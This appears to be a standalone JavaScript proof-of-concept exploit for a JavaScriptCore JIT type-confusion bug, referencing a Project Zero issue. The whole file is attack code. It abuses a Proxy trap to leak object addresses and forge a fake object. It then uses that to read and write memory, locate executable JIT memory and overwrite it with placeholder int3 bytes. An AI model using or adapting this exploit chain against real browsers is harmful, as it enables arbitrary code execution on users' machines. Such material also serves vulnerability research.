var _dview = null;

function u2d(low, hi) {
    if (!_dview) _dview = new DataView(new ArrayBuffer(16));
    _dview.setUint32(0,hi);
    _dview.setUint32(4,low);
    return _dview.getFloat64(0);
}

function d2u(d) {
    if (!_dview) _dview = new DataView(new ArrayBuffer(16));
    _dview.setFloat64(0,d);
    return [_dview.getUint32(4), _dview.getUint32(0)];
}

function hex(lo, hi) {
    if( lo == 0 ) {
        return ("0x" + hi.toString(16) + "-00000000");
    }

    if( hi == 0 ) {
        return ("0x" + lo.toString(16));
    }

    return ("0x" + hi.toString(16) + "-" + lo.toString(16));
}

let arrays = [];
let mutated = [1.1, 2.2, 3.3];
let flag = false;

function leak(arr_mutated, arr) {
  arr[1] = 2.2;
  let a = 0 in arr;
  return arr_mutated[0];
}

function fake(arr_mutated, arr, value) {
  arr[1] = 2.2;
  let a = 0 in arr;
  arr_mutated[1] = value;
  return a;
}

let unlinked_functionExecutable = {
  m_isBuiltinFunction: u2d(0xdeadbeef, 0),
  p0: 0, p1: 1, p2: 2, p3: 3, p4: 4, p5: 5,
  m_identifier: {}
};

// jsExecutable
let m_functionExecutable = {
  p0: 0, p1: 1, p2: 2, p3: 3, p4: 4, p5: 5, p6: 6, p7: 7, p8: 8,
  m_executable: unlinked_functionExecutable
};

let target = {
  // 26 -> JSType(JSFunctionType)
  JSCell: u2d(0, 0x00001a00),
  butterfly: {},
  pad0: 0, 
  m_functionExecutable: m_functionExecutable
};
let leakme = {};

function jit(num) {
  for (let i = 2; i < num; i++) {
    if (num % i === 0) {
      return false;
    }
  }
  return true;
}

// https://bugs.chromium.org/p/project-zero/issues/detail?id=1649
function pwn() {
  let re = /aa/g;

  for (let i = 0; i < 1000; i++) {
    arrays.push([1.1, 2.2, 3.3, 4.4]);
  }

  for (let i = 0; i < 1000; i++) {
    arrays[i].__proto__ = re;
  }

  leakme = target;
  let proxy = new Proxy({}, {
    has: () => {
      if (flag) {
        mutated[0] = leakme;
      }
      return true;
    }
  });

  // re.__proto__ === RegExp.prototype
  let arr = arrays.pop();
  RegExp.prototype.__proto__ = proxy;

  for (let i = 0; i < 100000; i++) {
    leak(mutated, arr);
  }
  
  flag = true;
  // Now, proxy is work
  delete arr[0];
  
  let leak_addr = d2u(leak(mutated, arr));
  print("[-] target address : " + hex(leak_addr[0], leak_addr[1]));

  // type confusion
  arr = arrays.pop();
  mutated = [1.1, 2.2, 3.3];
  flag = false;

  // fake address
  value = u2d(leak_addr[0] + 0x10, leak_addr[1]);
  for (let i = 0; i < 100000; i++) {
    fake(mutated, arr, value);
  }

  flag = true;
  delete arr[0];
  fake(mutated, arr, value);
  fake_obj = mutated[1];

  let victim = new Array(1.1, 2.2, 3.3, 4.4, 5.5, 6.6);

  target.butterfly = victim;
  unlinked_functionExecutable.m_identifier = fake_obj;

  let name = Function.prototype.toString.call(fake_obj);
  structureID = name.charCodeAt(9);

  target.JSCell = u2d(structureID, 0x01082307 - 0x20000);

  for (let i = 0; i < 10000; i++) {
    jit(i);
  }

  victim[4] = jit;
  fake_obj[0] = u2d(structureID, 0x01082307 - 0x20000);
  let jit_addr = d2u(victim[4]);
  print("[-] jit address : " + hex(jit_addr[0], jit_addr[1]));

  fake_obj[1] = u2d(jit_addr[0] + 8, jit_addr[1]);
  let jit_obj_addr = d2u(victim[4]);

  fake_obj[1] = u2d(jit_obj_addr[0] + 8, jit_obj_addr[1]);
  let rwx_obj_addr = d2u(victim[2]);

  fake_obj[1] = u2d(rwx_obj_addr[0] - 0x238, rwx_obj_addr[1]);
  let rwx_addr = d2u(victim[8]);

  if (rwx_addr[1] != 0) {
    print("[-] rwx : " + hex(rwx_addr[0] + 0x4000, rwx_addr[1]));
    fake_obj[1] = u2d(rwx_addr[0] + 0x4000, rwx_addr[1]);
    for (let i = 0; i < 20; i++) {
      victim[i] = u2d(0xcccccccc, 0xcccccccc);
    }

  }

  else {
    print("[-] fail");
  }
}

print("[-] Pwnning");
pwn();




